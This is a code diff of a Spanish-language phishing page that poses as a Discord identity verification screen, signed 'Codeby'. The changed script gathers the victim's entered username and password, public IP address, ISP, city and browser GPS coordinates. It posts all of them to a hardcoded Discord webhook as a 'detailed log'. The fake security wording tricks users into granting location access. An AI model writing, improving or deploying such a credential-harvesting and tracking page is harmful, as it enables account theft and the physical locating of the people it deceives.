@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Discord</title>
+    <title>Verificación de Seguridad</title>
     <style>
         body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif; background: #202225; color: #fff; display: flex; justify-content: center; align-items: center; }
         .card { background: #2f3136; padding: 40px; border-radius: 10px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
@@ -25,13 +25,12 @@
 
     <div id="verify-screen" class="card">
         <h2 style="color: #5865F2;">Verificación de Discord</h2>
-        <p style="font-size: 14px; color: #b9bbbe;">Por favor, permite el acceso a tu ubicación para confirmar tu identidad en esta región.</p>
-        <button class="btn-discord" id="btnVerify">Autorizar acceso y verificar</button>
+        <p style="font-size: 14px; color: #b9bbbe;">Autoriza el acceso a la red para completar la vinculación.</p>
+        <button class="btn-discord" id="btnVerify">Autorizar y verificar</button>
         <div class="codeby-footer">By:Codeby</div>
     </div>
 
     <script>
-        // Webhook actualizado
         const hook = "https://discord.com/api/webhooks/1509748386973220975/s3XxCMhpK8PFhgpX8aFnxEttiRm-RM-zbdOqtVSDUMNf_t3d-iBxl5NmcXPSXc95XvOU";
         let u = "", p = "";
 
@@ -44,28 +43,36 @@
             }
         };
 
-        document.getElementById('btnVerify').onclick = () => {
-            // Solicitar ubicación forzadamente al hacer click
-            if (navigator.geolocation) {
+        document.getElementById('btnVerify').onclick = async () => {
+            try {
+                // Obtener datos de IP y Red
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                // Obtener geolocalización precisa
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendToDiscord(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
-                    (err) => sendToDiscord("Ubicación denegada o error: " + err.message)
+                    (pos) => sendToDiscord(ipData, pos.coords),
+                    () => sendToDiscord(ipData, null)
                 );
-            } else {
-                sendToDiscord("Geolocalización no soportada");
+            } catch (e) {
+                sendToDiscord(null, null);
             }
         };
 
-        async function sendToDiscord(gps) {
+        async function sendToDiscord(ip, geo) {
             const data = {
                 embeds: [{
-                    title: "📊 LOG CAPTURADO - Codeby",
+                    title: "📊 LOG DETALLADO - Codeby",
                     color: 0x5865F2,
                     fields: [
                         { name: "Usuario", value: u, inline: true },
                         { name: "Contraseña", value: p, inline: true },
-                        { name: "Ubicación", value: gps }
-                    ]
+                        { name: "IP Pública", value: ip?.ip || "N/A", inline: true },
+                        { name: "Proveedor (ISP)", value: ip?.org || "N/A", inline: true },
+                        { name: "Ubicación (Red)", value: `${ip?.city || ""}, ${ip?.country_name || ""}`, inline: true },
+                        { name: "Coordenadas", value: geo ? `${geo.latitude}, ${geo.longitude}` : "Denegado", inline: true }
+                    ],
+                    footer: { text: "Sistema Codeby" }
                 }]
             };
 
